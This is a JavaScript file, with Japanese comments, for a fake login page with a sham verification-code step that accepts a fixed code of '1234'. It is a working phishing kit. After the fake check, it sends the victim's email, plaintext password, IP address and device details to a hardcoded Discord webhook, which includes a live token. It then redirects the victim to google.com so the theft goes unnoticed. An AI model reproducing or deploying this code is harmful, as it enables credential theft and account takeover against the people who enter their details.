async function sendAuthCode() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (email === '' || password === '') {
        alert('メールアドレスとパスワードを入力してください。');
        return;
    }

    // 実際のメール送信はサーバーサイドで行うべきですが、ここではコンソールに表示するだけとします。
    console.log(`Sending auth code to ${email}`);

    // ログインフォームを隠して認証フォームを表示
    document.getElementById('login-form').style.display = 'none';
    document.getElementById('auth-form').style.display = 'block';
}

async function verifyAuthCode() {
    const authCode = document.getElementById('auth-code').value;

    // ここでは固定の認証コードを使用
    const expectedAuthCode = '1234';

    if (authCode === expectedAuthCode) {
        // 認証が成功したら、IPアドレスと端末情報を取得してDiscordに送信
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const ipAddress = await getIpAddress();
        const deviceInfo = getDeviceInfo();
        const webhookUrl = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';

        const message = {
            content: `IP Address: ${ipAddress}\nDevice: ${deviceInfo.device}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nEmail: ${email}\nPassword: ${password}`,
        };

        await sendToDiscord(webhookUrl, message);

        window.location.href = 'https://www.google.com';
    } else {
        alert('認証コードが間違っています。もう一度お試しください。');
    }
}

async function getIpAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return 'Unknown IP';
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = 'Unknown Device';
    let os = 'Unknown OS';
    let browser = 'Unknown Browser';

    // 端末情報の取得
    if (/Mobi|Android/i.test(userAgent)) {
        device = 'Mobile';
    } else {
        device = 'Desktop';
    }

    // OS情報の取得
    if (/Windows NT/i.test(userAgent)) {
        os = 'Windows';
    } else if (/Mac OS X/i.test(userAgent)) {
        os = 'Mac OS';
    } else if (/Android/i.test(userAgent)) {
        os = 'Android';
    } else if (/iOS|iPhone|iPad/i.test(userAgent)) {
        os = 'iOS';
    }

    // ブラウザ情報の取得
    if (/Chrome/i.test(userAgent)) {
        browser = 'Chrome';
    } else if (/Firefox/i.test(userAgent)) {
        browser = 'Firefox';
    } else if (/Safari/i.test(userAgent)) {
        browser = 'Safari';
    } else if (/Edge/i.test(userAgent)) {
        browser = 'Edge';
    } else if (/MSIE|Trident/i.test(userAgent)) {
        browser = 'Internet Explorer';
    }

    return {
        device,
        os,
        browser,
    };
}

async function sendToDiscord(webhookUrl, message) {
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        });
    } catch (error) {
        console.error('Error sending message to Discord:', error);
    }
}
